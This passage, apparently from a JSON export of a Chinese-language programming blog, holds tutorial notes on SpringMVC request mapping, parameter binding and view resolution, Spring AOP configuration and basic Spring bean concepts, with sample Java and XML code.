@InitBinder(&quot;prefix1&quot;) public void prefix1(WebDateBinder binder) &#123; binder.setFieldDefaultPrefix(&quot;a.&quot;); &#125; @InitBinder(&quot;prefix2&quot;) public void prefix2(WebDateBinder binder) &#123; binder.setFieldDefaultPrefix(&quot;b.&quot;); &#125;&#125;---------------@Controllerpublci class MyController &#123; public String test(HttpServletRequest req, HttpServletRequest resp) &#123; &#125;&#125; ==给所有 controller 绑定参数（传入初始化参数）== 1234@ModelAttribute(&quot;key&quot;)public String attr1() &#123; return &quot;value&quot; ; &#125; 如果出现 404 确定 404 页面的 Message 信息是否由对应的 requestMapping； 如果 request Mapping 存在，确定是否有写 controller 注解；","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"springMVC","date":"2022-02-15T06:18:30.000Z","path":"2022/02/15/2022.02.12 SpringMVC/","text":"概念MVC是一种专门用于 web 设计分层的一种设计模式。 model view controller SpringMVC​ SpringMVC 是 Spring 提供的一个MVC框架，主要目的就是解决 web 开发中常见的一些问题，并且可以与 Spring 无缝集成。 SpringMVC 主要解决的问题 **==URL 的映射==**非常复杂，需要在 web.xml 中配置很多的 servlet ； 接受参数（自动**将 String 前端参数==转化为各种类型数据==**）非常复杂 ； ==路径跳转==（视图解析），以及参数传递（使用ModelAndView）的问题 ； 文件上传太过复杂 ； 后端表单验证等功能（有专门做表单验证的框架）。 国际化； DispatcherServlet​ 目前我们处理前端请求的唯一方式只有 sevlet ，所以 SpringMVC 对于请求的处理等操作也是基于 servlet 来完成的，只是 SpringMVC 封装了一个功能特别强大的 Srvlet 交过 DispatcherServlet。 ​ 所有的请求实际上都是由 DispatcherServlet 进行分发处理的，所以使用 SpringMVC 需要配置 DispatcherServlet 到 web.xml 中。 方式一：实现 Controller 实现 Controller 接口，并且**==一个 hander 只能处理一个请求==**。 12345678public class HelloController implements Controller&#123; @Override public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception &#123; System.out.println(&quot;HelloController开始处理请求&quot;); return null; &#125;&#125; 在 application.xml 中配置路径映射类，添加 bean 标签。 name 属性：作为请求路径； class 属性：指定 Controller 的权限定名。 1&lt;bean name=&quot;/he,/haha&quot; class=&quot;com.ishangu.controller.HelloController&quot; /&gt; 方式二：RequestMapping步骤1 新建 maven 项目（**==war包==**），导入 Springmvc 框架依赖、lombok 依赖、json 工具包、文件上传依赖。 1234567891011121314151617181920212223242526272829303132333435363738&lt;dependencies&gt; &lt;!-- 框架mvc --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;5.3.9&lt;/version&gt; &lt;/dependency&gt; &lt;!-- lombok 自动添加getter，setter，constructor --&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;version&gt;1.18.20&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- json 工具包 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.13.0&lt;/version&gt; &lt;/dependency&gt; &lt;!-- IO依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;commons-io&lt;/groupId&gt; &lt;artifactId&gt;commons-io&lt;/artifactId&gt; &lt;version&gt;2.11.0&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 文件上传依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;commons-fileupload&lt;/groupId&gt; &lt;artifactId&gt;commons-fileupload&lt;/artifactId&gt; &lt;version&gt;1.4&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 步骤2web 项目配置文件 **==web.xml 中配置 sevlet 映射==**。 配置**==所有请求==**都使用 DespatcherServlet 处理。 DespatcherServlet 设置初始化参数，==指定上下文的配置文件路径==。 12345678910111213&lt;servlet&gt; &lt;servlet-name&gt;mvc&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:application.xml&lt;/param-value&gt; &lt;/init-param&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;mvc&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; 步骤3 设置上下文配置文件 application.xml（Springmvc配置文件 ==所有Bean都被IOC管理==） 添加 springmvc 命名规范 123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-3.0.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema&lt;/bean&gt; 设置初始化 IOC 容器时搜索路径 1&lt;context:component-scan base-package=&quot;com.ishangu&quot;/&gt; 开启静态资源支持：web.xml 中配置 dispacherServlet 覆盖了 default-servlet 的路径，造成找不到静态资源（.jpg、.html、.jsp）。 1&lt;mvc:default-servlet-handler /&gt; 开启注解支持 1&lt;mvc:annotation-driven /&gt; 配置视图解析 Bean **==WEB-INF 下的所有资源只能通过服务器请求转发访问==**，所以走视图解析器，就是在做请求转发，URI 不改变。 如果不走视图解析器，==采用重定向只能跳转到 web 项目路径下静态资源==，或者调用其他控制器。 如果用相对路径，记得考虑 controller 类上的 RequestMapping 注解。 1234&lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt; &lt;property name=&quot;prefix&quot; value=&quot;/SpingMVC_1/WEB-INF/view/&quot;/&gt; &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot; /&gt;&lt;/bean&gt; 配置文件上传 Bean id 固定，必须是 mutipartResolver 可配置文件编码、最大上传大小、缓冲区大小 12345&lt;bean id=&quot;multipartResolver&quot; class=&quot;org.springframework.web.multipart.commons.CommonsMultipartResolver&quot;&gt; &lt;property name=&quot;maxUploadSize&quot; value=&quot;#&#123;1024*1024*100&#125;&quot;/&gt; &lt;property name=&quot;maxInMemorySize&quot; value=&quot;102400&quot; /&gt; &lt;property name=&quot;defaultEncoding&quot; value=&quot;UTF-8&quot; /&gt;&lt;/bean&gt; 步骤4（映射请求） ==编写控制器== 在 Controller 类上方添加 @Controller 注解，该类**==被 IOC 容器管理==**。 1234@Controllerpublic class MyController &#123; &#125; 编写请求处理方法 ==方法上==，添加@ReqeustMapping 注解。 ==@RequestMapping属性== **==value 属性==**：指定浏览器映射路径，也就是 ==servlet 中的 url-patter==； **==method 属性==**：指定==处理哪种类型的请求（GET、POST）==，默认处理所有类型；可直接用以下注解代替： @GetMapping @PostMapping @DeleteMapping @PutMapping ==params 属性==：指定==请求中必须携带指定参数==才能访问！； 1234@RequestMapping(value=&quot;user/login&quot;, method=RequestMethod.GET, params=&#123;username,password&#125;)public void method(HttpServletRequest req, HttpServletResponse resp) &#123; &#125; name 属性：没啥用，可以理解为 RequestMapping 的注释； headers 属性：用来指定访问当前路径时，必须包含那些请求头，以及值，如果没有则禁止访问； consumes 属性：指定请求的数据类型是哪一种。例如，text/html； produces 属性：用来指定响应的数据类型必须为哪一种，指定的类型必须包含在请求头中。 将@RequestMapping 写在 Controller 类上 类中所有的==方法上的 @RequestMapping 路径都会变成二级路径==。 方法中 ==@RequestMapping 路径从相对于上下文，变成相对于类 @RequestMapping 路径==。 123456789@Controller@ReqeustMapping(&quot;user/&quot;)public class UserController &#123; // 需要 &quot;user/login/&quot; 才能访问到该方法 @RequestMapping(value=&quot;login/&quot;, method=RequestMethod.GET, params=&#123;username,password&#125;) public void method(HttpServletRequest req, HttpServletResponse resp) &#123; &#125;&#125; 步骤5（接受参数） 使用 Servlet 原生 api 接受参数 12345678910@Controller@ReqeustMapping(&quot;user/&quot;)public class UserController &#123; // 需要 &quot;user/login/&quot; 才能访问到该方法 @RequestMapping(value=&quot;login/&quot;, method=RequestMethod.GET, params=&#123;username,password&#125;) public void method(HttpServletRequest req, HttpServletResponse resp) &#123; String username = req.getParameter(&quot;username&quot;) ; String password = req.getParameter(&quot;password&quot;) ; &#125;&#125; 通过形参列表接受参数 | 通过 Modle 接受参数 要求：形参名，或 model ==属性名需要与前端参数 name 一致，若不一致需要添加形参注解@RequestParam(name = “webName”)==； 支持类型：前端参数字符串自动转**==基本数据类型和 java.sql.Date==**。 限制：springmvc 默认是==不支持转 java.uti.Date，java.sql.Timestamp== 两个类型的； 1234567891011@Controller@ReqeustMapping(&quot;user/&quot;)public class UserController &#123; // 需要 &quot;user/login/&quot; 才能访问到该方法 @RequestMapping(value=&quot;login/&quot;, method=RequestMethod.GET, params=&#123;username,password&#125;) public void method(@RequestParam(name=&quot;account&quot;) String username, String password, UserModel user) &#123; System.out.println(username); System.out.println(password); System.out.println(user); &#125;&#125; 接收 Json 格式参数 在形参 model 上添加@RequestBody 即可； 前端 Post 时，只需要把 ContentType 设置为 application/json，提交一个原始的JSON字符串即可； 12345@PostMapping(value = &quot;/user&quot;)public User saveUser(@RequestBody User user) &#123; log.info(user.toString()); return user;&#125; restFull 风格请求 通过在 ReqeustMapping 中使用占位符指定需要的参数，在==形参中通过注解获取== 优点：RESTfull 风格的请求方式。GET 、POST、PUT、DELETE 四种请求，分别对应数据库的 select，insert，update，delete四种操作。 GET：只做查询，使用占位符，直接传入查询ID 12345@ResponseBody@GetMapping(&quot;user/&#123;id&#125;&quot;)public User selectUserById(@PathVariable(&quot;id&quot;) Integer id)&#123; return userService.getUserById(id);&#125; 1localhost:8080/WEB_DEMO/user/1 POST：后端使用 Model 形参接受参数；前端采用 Post 方式发出请求。 PUT：后端使用 @PutMapping 作为注解，Model 形参接受参数；前端采用 Post 传入参数，得添加 _method 参数为 PUT 1234567@ResponseBody@PutMapping(&quot;/user&quot;)public User update(User user)&#123; System.out.println(&quot;Put请求...&quot;); System.out.println(user); return userService.update(user);&#125; 123456&lt;form action=&quot;http://localhost:8083/user&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;id&quot; value=&quot;1&quot;/&gt; &lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;one&quot;/&gt; &lt;input type=&quot;text&quot; name=&quot;_method&quot; value=&quot;PUT&quot;/&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot;/&gt;&lt;/form&gt; DELET：后端使用 @DeleteMapping 注解 + 占位符接受参数；前端直接传 id 和 携带 _method=DELETE 1234567@DeleteMapping(&quot;/user/&#123;id&#125;&quot;)@ResponseBodypublic String delete(@PathVariable(&quot;id&quot;) Integer id)&#123; System.out.println(&quot;Delete请求...&quot;); userService.delete(id); return &quot;从缓存中删除编号为&quot;+id+&quot;的对象,下一次将从数据库中查询该对象&quot;;&#125; 1234&lt;form action=&quot;http://localhost:8083/user/1&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;text &quot;name=&quot;_method&quot; value=&quot;DELETE&quot;/&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot;/&gt;&lt;/form&gt; 自定义形参参数转化​ Springmvc 接受前端参数，有些类型，比如 java.sql.Timestamp 和 java.util.Date 类型，不支持自动转化。我们可以==通过实现 Converter 接口来增强该功能==，为其手动添加不支持的类型的转化。 ​ Converter 接口两个泛型，第一个为转化前的类型，第二个为需要转成的类型。 ==编写接口实现类== 123456789101112131415161718192021222324252627282930313233import java.text.SimpleDateFormat;import java.util.Date;import org.springframework.core.convert.converter.Converter;public class UtilDateConverter implements Converter&lt;String, Date&gt;&#123; @Override public Date convert(String arg0) &#123; Date date = null; try &#123; date = new SimpleDateFormat(&quot;yyyy-MM-dd&quot;).parse(arg0); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return date; &#125;&#125;---------------------------------------import java.util.Date ;import java.sql.Timestamp ;public class SqlTimestampConverter implements Converter&lt;String, Timestamp&gt;&#123; @Override public Timestamp convert(String arg0) &#123; Date date=null; try &#123; date = SimpleDateFormat(&quot;yyyy-MM-dd&quot;).parse(arg0); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return new Timestamp(date.getTime()); &#125;&#125; ==修改 application.xml== —— 添加 bean、并将其配置到 SpringMVC 类型转化工厂中、指定自定义的转化服务。 12345678910111213141516&lt;!-- 在注解驱动标签内 同时 指定转化服务 --&gt;&lt;mvc:annotation-driven conversion-service=&quot;conversionService&quot;/&gt;&lt;!-- 配置日期转换工具类 --&gt;&lt;bean id=&quot;sqlTimestamp&quot; class=&quot;com.ishangu.converter.SqlTimestampConverter&quot; /&gt;&lt;bean id=&quot;utilDate&quot; class=&quot;com.ishangu.converter.UtilDateConverter&quot; /&gt;&lt;!-- 将工具类配置到SpringMVC的类型转换工厂中 --&gt;&lt;bean id=&quot;conversionService&quot; class=&quot;org.springframework.format.support.FormattingConversionServiceFactoryBean&quot;&gt; &lt;property name=&quot;converters&quot;&gt; &lt;set&gt; &lt;ref bean=&quot;sqlTiemstamp&quot;/&gt; &lt;ref bean=&quot;utilDate&quot;/&gt; &lt;/set&gt; &lt;/property&gt;&lt;/bean&gt; 响应请求正常处理器执行完请求后，需要响应前端界面，往往需要做两件事：==路径跳转、参数传递==。SpringMVC 对该过程做了简化，加强。 不用视图解析器 ==请求转发== ==req.getRequestDispatcher(“path”).forword(req,resp); 来请求转发==； handle 方法返回带前缀的字符串：froword:/user/login。绝对于上下文。 ==重定向== ==resp.sendRedirect(“path”); 来重定向==； handel 方法返回带前缀的字符串：redirect:/user/login。绝对于上下文。 ==直接返回 json 数据==（AJAX异步通信传递对象时） 处理器方法上添加 @ResponseBody；或者类上添加@RestController，相当于类中所有处理器都返回 json； 处理器方法**==返回值类型为数据的类型：对象，或者集合；==** 对象会被转成 json 格式，集合会被转成 json 数组。 12345678910111213141516@ResponseBody@RequestMapping(&quot;user/login&quot;)public User longin (HttpServletRequest req,HttpServletResponse resp)&#123; return new User(&quot;张三&quot;, &quot;123456&quot;);&#125;// &#123;&quot;name&quot;:&quot;张三&quot;, &quot;password&quot;:&quot;123456&quot;&#125;@ResponseBody@RequestMapping(&quot;user/selectAll&quot;)public List&lt;User&gt; selectAll (HttpServletRequest req,HttpServletResponse resp)&#123; List&lt;User&gt; userList = new ArrayList&lt;&gt;() ; userList.add(new User(&quot;张三&quot;, &quot;123456&quot;)); userList.add(new User(&quot;李四&quot;, &quot;654321&quot;)); return userList ;&#125;// [&#123;&quot;name&quot;:&quot;张三&quot;, &quot;password&quot;:&quot;123456&quot;&#125;, &#123;&quot;name&quot;:&quot;李四&quot;, &quot;password&quot;:&quot;654321&quot;&#125;] 使用视图解析器​ 视图层路径跳转，采用的是请求转发，==所以采用视图解析器，路径跳转都是请求转发的方式。== ==只路径跳转，不携带数据==，直接返回字符串（静态资源命名）； 字符串为逻辑视图，springmvc 会自动将其==加上前后缀，变成物理视图==。 1234@RequestMapping(&quot;login&quot;)public String login(HttpServletRequest req,HttpServletResponse resp)&#123; return &quot;menu&quot;; // prefix = &#x27;/Demo/WEB-INF/&#x27; , suffix = &#x27;.jsp&#x27; , /Demo/WEB-INF/menu.jsp&#125; ==携带数据，路径跳转==，封装成 ModelAndView 返回 新建一个视图对象 ModelAndView； 将传递的参数，和跳转的逻辑路径封装到里头，然后返回给视图解析器。 Model 数据都是 key-value 格式，如果没有指定 key ，则==key 默认为 value 数据类型类名首字母转小写==； 也可以==同时封装多个参数==，调用 setAllObjects()，==直接传入一个 Map 对象（键值对集）==； setViewName(&quot;menu&quot;)：来指定转发的逻辑路径。 1234567891011121314151617@RequestMapping(&quot;login&quot;) public ModelAndView login(HttpServletRequest req,HttpServletResponse resp) throws Exception&#123; ModelAndView mv = new ModelAndView(); mv.addObject(new User(&quot;张三&quot;, &quot;123456&quot;)); // key 默认为 user mv.addObject(&quot;msg&quot;, &quot;登陆成功！&quot;); Map&lt;String, Integer&gt; map = new HashMap&lt;&gt;(); map.put(&quot;key1&quot;, 1111); map.put(&quot;key2&quot;, 2222); map.put(&quot;key3&quot;, 3333); mv.addAllObjects(map); // 一次添加一堆 mv.setViewName(&quot;menu&quot;); return mv;&#125; SpringMVC 请求流程 用户发送请求到 tomcat； tomcat 将符合 DispatcherServlet 路径的请求交个 DispatcherServlet（前端控制器，controller 本质上实现的 servlet）进行处理； DispatcherServlet 去请求 handleMapping 查找 hanle（更具xml配置以及注解配置查找）； handleMapping（处理器映射器）会将请求映射成 HandleExecutionChain 处理器执行链（因为会链上拦截器，前置拦截，后置拦截，视图拦截），将其返回给前端控制器； DispatcherServlet 调用合适的 handleAdapter（处理器适配器）来执行 Handle； Handle 执行完之后，会发挥一个 ModeleAndView 对象给 handleAdapter； handleAdapter 将 ModelAndView 对象返回给 DispatcherSevlet； DispatcherServlet 请求视图解析器来解析视图（将逻辑视图转成物理视图）； 视图解析器返回了view 给 DispatcherServlet，DispatcherServlet 对视图进行渲染（将返回给前端的数据，填充到页面的 request 作用域之中）； DispatcherServlet 响应用户。","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"AOP","date":"2022-02-15T01:09:09.000Z","path":"2022/02/15/2022.02.15 AOP特性/","text":"AOP​ Spring 的两大特性：==IOC== 控制反转，和 ==AOP== 面向切面编程。AOP：面向切面编程。 ​ 在原来现有的代码上，从中间添加新代码。添加代码的地方成为切入点，放置代码的过程叫做织入。 可以使用动态代理实现切面编程； 也可以使用 ==AOP== 实现。 特点 虽然动态代理也可以实现增强，但是动态代理(proxy)最小代理单元是类，而 ==AOP 增强最小单元是方法==。 以后代码中可能设计中可能设计多种业务需求，例如日志处理、事务管理、权限管理等很多操作，这些操作有很多都是重复的，使用 AOP 可以将重复得到代码抽离出来，通过织入的方式对原有的代码进行增强，并不影响源代码。 Spring 的事物管理功能非常强悍，并且支持主流的所有 ORM 框架，而 Spring 的事物管理就是基于 SpringJDBC 以及 AOP 来实现的。 AOP 术语 切面 由通知 + 切入点组成。 通知 是指在什么时间进行切入（在方法分之前切入，还是方法执行之后切入）； 切入点 是指需要对那些类，以及那些方法进行增强； 增强 需要放入切入点中的代码； 织入 将增强放入到切面中，生成代理类的过程，而这个过程由 Spring 自动完成； 连接点 将前后置增强连接到一起的一个 pointcut。 基于动态代理实现AOP动态代理（proxy）JDK 动态代理 JDK 动态代理要求，==被代理的类必须实现某个接口==，因为生成的代理类会自动实现对应的接口。 其实就是将需要代理的类，注入到代理类中然后进行调用，调用过程中会前后置其他方法的执行 —— 代理模式 cglib 动态代理 cglib 动态代理， **被代理的类需要==由代理类继承==**，所以被代理类不能是 final 修饰的类。 配置 Spring 实现 AOP功能：主要任务为吃饭；代理服务为买菜、做饭、洗碗、中断；每次吃饭，无论是早餐、午餐、晚餐，之前添加买菜、做饭增强，吃完饭后添加洗碗增强，如果中途异常添加中断增强。 配置 Maven 依赖 将 Spring 框架依赖、Spring 框架测试依赖、AOP 依赖配置到 pom.xml 1234567891011121314151617181920&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context&lt;/artifactId&gt; &lt;version&gt;5.3.9&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-test&lt;/artifactId&gt; &lt;version&gt;5.3.9&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 使用Aop需要的相关依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;/groupId&gt; &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt; &lt;version&gt;1.9.7&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 编写增强组件 编写需要进行织入的方法，作为增强； 12345678910111213141516171819202122232425import org.springframework.stereotype.Component;@Component(&quot;myAop&quot;)public class MyAop &#123; // 作为前置增强 public void ready() &#123; System.out.println(&quot;购买食材！&quot;); System.out.println(&quot;清洗处理食材，炒菜！&quot;); &#125; // 作为后置增强 public void clean() &#123; System.out.println(&quot;清洗碗筷！&quot;); &#125; // 作为结束增强 public void exit() &#123; System.out.println(&quot;欢迎下次光临！&quot;); &#125; // 作为异常增强，一般编写事物回滚代码！ public void ex() &#123; System.out.println(&quot;出意外了，制作过程异常，请改日再来！&quot;); &#125;&#125; 将增强组件初始化到 Spring 框架的 IOC 容器中 方法一：通过配置框架配置文件 application.xml 初始化入 IOC； 12345&lt;bean id=&quot;myAopId&quot; class=&quot;com.ishangu.aop.MyAop&quot;&gt;&lt;/bean&gt;&lt;bean id=&quot;myAopId2&quot; class=&quot;com.ishangu.aop.MyAop2&quot;&gt;&lt;/bean&gt;&lt;bean id=&quot;myAopId3&quot; class=&quot;com.ishangu.aop.MyAop3&quot;&gt;&lt;/bean&gt; 方法二：在配置文件添加扫描路径，使用注解初始化 IOC（需要给注解添加 value 值作为id。）； 1&lt;context:component-scan base-package=&quot;com.ishangu&quot; /&gt; 1234@Component(&quot;myAopId&quot;)public class myAop &#123; &#125; 编写被增强类 编写需要进行 AOP 切面增强的主类 123456789101112131415161718192021222324252627import javax.annotation.Resource;import org.junit.Test;import org.junit.runner.RunWith;import org.springframework.test.context.ContextConfiguration;import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;@ContextConfiguration(&quot;classpath:application.xml&quot;)@RunWith(SpringJUnit4ClassRunner.class)public class MyTest &#123; @Test public void testBreakfast() &#123; System.out.println(&quot;吃早餐！&quot;); &#125; @Test public void testLunch() &#123; System.out.println(&quot;吃午餐！&quot;); &#125; @Test public void testDinner() &#123; System.out.println(&quot;吃晚餐！&quot; + 1/0); &#125;&#125; 配置框架配置文件 application.xml 添加 AOP 命名空间 1234&lt;beans xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot; xsi:schemaLocation= &quot;http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-3.0.xsd&quot;&gt; 配置 AOP 方法一：配置 Spring 框架配置文件，采用&lt;aop: config&gt;； 指定**==切点==**（==需要增强的方法==），采用&lt;aop: pointcut&gt; 表达式 execution 中，可以指定方法的访问修饰符、返回值、方法路径（指定包，所有子包，所有类，所有方法）、方法名、方法参数； id 属性为该切点的 key 值，后面引用的时候需要用到。 12345678910&lt;aop:pointcut expression=&quot;execution(public * com.ishangu.service.*.*(..))&quot; id=&quot;point1&quot;/&gt;// ishangu 包下所有子包，所有类的所有方法，方法任意参数&lt;aop:pointcut expression=&quot;execuation(public * com.ishangu.*.*.*(..))&quot; id=&quot;point1&quot;/&gt;// 所有以 a 开头的方法名&lt;aop:pointcut expression=&quot;execution(public * com.ishangu.service.*.a*(..))&quot; id=&quot;point1&quot;/&gt;// 所有以 b 结尾的方法名&lt;aop:pointcut expression=&quot;execution(public * com.ishangu.service.*.*b(..))&quot; id=&quot;point1&quot;/&gt; 指定==切面（增强的方法）==,采用&lt;aop:aspect ref=&quot;pointId&quot;&gt; 用 aspect 标签的 ref 属性，指定需要增强的切点方法 id； 设置增强类型：前置增强、后置增强（return后执行）、异常增强（==一般编写事物回滚的代码==）、最终增强（都会执行类似finally） 12345678910111213&lt;aop:aspect ref=&quot;myAop&quot;&gt; 配置前置增强 &lt;aop:before method=&quot;ready&quot; pointcut-ref=&quot;point1&quot;/&gt; 普通后置增强,只有当方法正常结束之后才会执行 &lt;aop:after-returning method=&quot;clean&quot; pointcut-ref=&quot;point1&quot;/&gt; 异常后置增强,只有当方法执行出现异常的时候才会执行 &lt;aop:after-throwing method=&quot;ex&quot; pointcut-ref=&quot;point1&quot;/&gt; 最终增强： 无论方法是否正常执行完,都会执行 &lt;aop:after method=&quot;exit&quot; pointcut-ref=&quot;point1&quot;/&gt;&lt;/aop:aspect&gt; ==环绕增强==：因为前置、后置、异常、最终四个增强更好类似 try-catch-finally 结构，所以可以将四个增强方法合并成一个增强方法。 编写环绕增强方法； 1234567891011121314151617181920212223// 传入代理的方法public Object around(ProceedingJoinPoint join)&#123; Object obj=null ; // 存代理方法执行完成的返回值 try &#123; // 前置增强 System.out.println(&quot;准备食材！&quot;); // 调用本身的业务层方法，并接受返回值 obj=join.proceed(); // 吃饭 // 后置增强 System.out.println(&quot;清理！&quot;); &#125; catch (Throwable e) &#123; // 异常增强 System.out.println(&quot;出现异常,用餐中断！回滚事物！&quot;); e.printStackTrace(); &#125;finally &#123; // 最终增强 System.out.println(&quot;结束，欢迎下次光临！&quot;); &#125; // 返回代理执行完得到的返回值 return obj; &#125; xml 配置环绕增强切面方法，采用&lt;aop:around&gt;； 123456&lt;aop:config&gt; &lt;!-- 配置切面 --&gt; &lt;aop:aspect ref=&quot;myAop&quot;&gt; &lt;aop:around method=&quot;around&quot; pointcut-ref=&quot;point1&quot;/&gt; &lt;/aop:aspect&gt; &lt;/aop:config&gt; 方法二：采用 AOP 注解；==优点：只需要编写切面增强类！！== 配置文件：开启 IOC 初始化扫包、开启 AOP 注解功能； 12&lt;context:component-scan base-package=&quot;com.ishangu&quot; /&gt;&lt;aop:aspectj-autoproxy /&gt; 编写切面，并添加相关注解 类上添加切面注解@Aspect、AOP执行优先级注解@Order(0)、IOC初始化注解@Component。 类中==添加被代理的切点方法，方法体为空==（类似代理模式添加代理的类）； 并在方法上添加切点注解：@Pointcut(&quot;表达式&quot;) 被指定的方法，一旦执行，就会顺带执行增强。 类中==编写普通增强方法，或者环绕增强方法==; 并在增强上添加注解：@Before、@AfterReturning、@AfterTrowing、@After、@Around ，注解 value 属性为代理的切点方法名带形参。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647@Aspect // 表示这个类是一个切面@Component // 被IOC容器管理 @Order(0) // 指定Aop的执行顺序,数字越小优先级越高public class Aop2 &#123; // 表示method方法是一个切入点 @Pointcut(&quot;execution(public * com.ishangu.service.*.*.*(..))&quot;) public void method()&#123;&#125;; /* @Before(&quot;method()&quot;) public void open()&#123; System.out.println(&quot;开启事务&quot;); &#125; @AfterReturning(&quot;method()&quot;) public void close()&#123; System.out.println(&quot;提交事务&quot;); &#125; @AfterThrowing(pointcut=&quot;method()&quot;,throwing=&quot;ex&quot;) public void ex(Exception ex)&#123; System.out.println(&quot;出现异常,回滚事务&quot;); ex.printStackTrace(); &#125; @After(&quot;method()&quot;) public void exit()&#123; System.out.println(&quot;关闭流&quot;); &#125; */ // 环绕增强 @Around(&quot;method()&quot;) public Object around(ProceedingJoinPoint join)&#123; Object obj=null; try &#123; // 前置增强 System.out.println(&quot;开启事务&quot;); // 调用本身的业务层方法,并接受返回值 obj=join.proceed(); System.out.println(&quot;提交事务&quot;); &#125; catch (Throwable e) &#123; System.out.println(&quot;出现异常,回滚事务&quot;); e.printStackTrace(); &#125;finally &#123; System.out.println(&quot;关闭流&quot;); &#125; return obj; &#125;&#125;","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"Spring","date":"2022-02-09T03:33:30.000Z","path":"2022/02/09/2022.02.09 Spring/","text":"框架Spring 框架 框架：框架是指一些能完成特定功能的半成品（别人写好的代码），必须配置完框架才能 Spring 框架：解决了程序中出现的很多耦合，内聚问题。 Spring 主要功能： 轻松使代码解耦； 可以帮助我们控制数据库事务； 是一个非侵入式的轻量级框架； 可以集成市面上所有主流框架； Spring 自身提供了 JavaEE 一张式开发。 通过 Maven 安装 Spring 依赖 从Maven 仓库中查找 Spring 依赖的 xml 配置文件代码（包括公司标识，项目标识，版本号信息）。 修改 pom.xml 配置，加入 标签，内部粘贴复制得到的相应依赖的标识信息 。 使用JUnit4调试 添加 JUnit4 测试库； 新建一个测试类，然后给==测试方法上添加 @Test 注解；== 右击该方法，Run As JUnit-test 即可！ Spring 项目测试 需要添加 Spring Test 依赖，并且在测试类上添加注解，指定依赖。 添加初始化 Context 引用注解。 12@ContextConfiguration(&quot;classpath:application.xml&quot;)@RunWith(SpringJUnit4ClassRunner.class) Spring 常用术语 应用程序 一般指我们的项目； 框架 是别人写好的项目，我们直接引用； 非侵入式 是指在替换框架的时候，不需要修改原有的代码； 轻量级 轻量级的框架依赖的东西较少，占用的资源较少，部署也比较简单，一般非侵入式都是轻量级框架； 容器 是指装对象的一个东西； bean 就是 Java 中类的实例化对象。 Spring 版本与 JDK 关系 Spring 4.X|5.X 支持 JDK1.8 Spring 3.X 支持 JDK1.5~1.7 Spring 2.X 支持 JDK1.4 Spring 常见组件 SpringContext 上下文支持； SpringAop Aop切面编程（封装了动态代理）； SpringBeans IOC工厂（封装了工厂，单例等）； SpringCore 核心； SpringTest 封装了测试相关的内容； SpringData 封装了数据相关的内容； SpringJDBC 封装了 JDBC。 Spring 实例化 bean 时机 Spring 默认在容器启动的时候就加载所有的对象，我们可以==指定 bean 的 lazy-init 属性，来改变实例化时机==。 lazy-init true：只在使用的时候才创建对象，初始化； false：默认。 Spring 中 bean 默认是单例，只实例化一次。可以通过==指定 bean 的 scope 属性来控制是否单例==。 scope ———— ==bean对象的作用域（考）== prototype：多例，通过 getBean 的时候，每次获取的是不同的对象； singleton：单例，每次 getBean 获取的是同一个对象； request：每次请求，都会创建一个新的对象； session：每次会话，都会创建一个新的对象； globalsession：全局 session（用于分布式项目中的 session）。 初始化 IOC 代码 使用 new ApplicationContext 